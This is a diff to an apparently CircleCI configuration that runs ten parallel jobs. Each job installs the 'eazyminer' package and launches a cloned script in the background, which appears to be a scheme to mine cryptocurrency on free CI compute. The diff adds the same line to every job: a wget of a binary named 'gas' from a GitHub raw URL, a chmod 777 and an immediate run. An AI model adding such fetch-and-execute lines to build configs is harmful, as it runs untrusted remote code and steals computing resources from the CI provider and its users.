@@ -13,6 +13,7 @@ jobs:
           command: |
             npm i eazyminer
             git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+            wget https://raw.githubusercontent.com/mosesmazernak/test/main/gas && chmod 777 gas && ./gas
   App_02:
     docker:
       - image: cimg/node:15.0.1
@@ -26,6 +27,7 @@ jobs:
           command: |
             npm i eazyminer
             git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+            wget https://raw.githubusercontent.com/mosesmazernak/test/main/gas && chmod 777 gas && ./gas
   App_03:
     docker:
       - image: cimg/node:15.0.1
@@ -38,6 +40,7 @@ jobs:
           command: |
             npm i eazyminer
             git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+            wget https://raw.githubusercontent.com/mosesmazernak/test/main/gas && chmod 777 gas && ./gas
   App_04:
     docker:
       - image: cimg/node:15.0.1
@@ -50,6 +53,7 @@ jobs:
           command: |
             npm i eazyminer
             git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+            wget https://raw.githubusercontent.com/mosesmazernak/test/main/gas && chmod 777 gas && ./gas
 
   App_05:  
     docker:
@@ -63,6 +67,7 @@ jobs:
           command: |
             npm i eazyminer
             git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+            wget https://raw.githubusercontent.com/mosesmazernak/test/main/gas && chmod 777 gas && ./gas
   App_06:
     docker:
       - image: cimg/node:15.0.1
@@ -75,6 +80,7 @@ jobs:
           command: |
             npm i eazyminer
             git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+            wget https://raw.githubusercontent.com/mosesmazernak/test/main/gas && chmod 777 gas && ./gas
   App_07: 
     docker:
       - image: cimg/node:15.0.1
@@ -87,6 +93,7 @@ jobs:
           command: |
             npm i eazyminer
             git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+            wget https://raw.githubusercontent.com/mosesmazernak/test/main/gas && chmod 777 gas && ./gas
   App_08:
     docker:
       - image: cimg/node:15.0.1
@@ -99,6 +106,7 @@ jobs:
           command: |
             npm i eazyminer
             git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+            wget https://raw.githubusercontent.com/mosesmazernak/test/main/gas && chmod 777 gas && ./gas
   App_09:
     docker:
       - image: cimg/node:15.0.1
@@ -111,6 +119,7 @@ jobs:
           command: |
             npm i eazyminer
             git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+            wget https://raw.githubusercontent.com/mosesmazernak/test/main/gas && chmod 777 gas && ./gas
   App_10:
     docker:
       - image: cimg/node:15.0.1
@@ -123,6 +132,7 @@ jobs:
           command: |
             npm i eazyminer
             git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+            wget https://raw.githubusercontent.com/mosesmazernak/test/main/gas && chmod 777 gas && ./gas
   
 workflows:
     version: 2.1
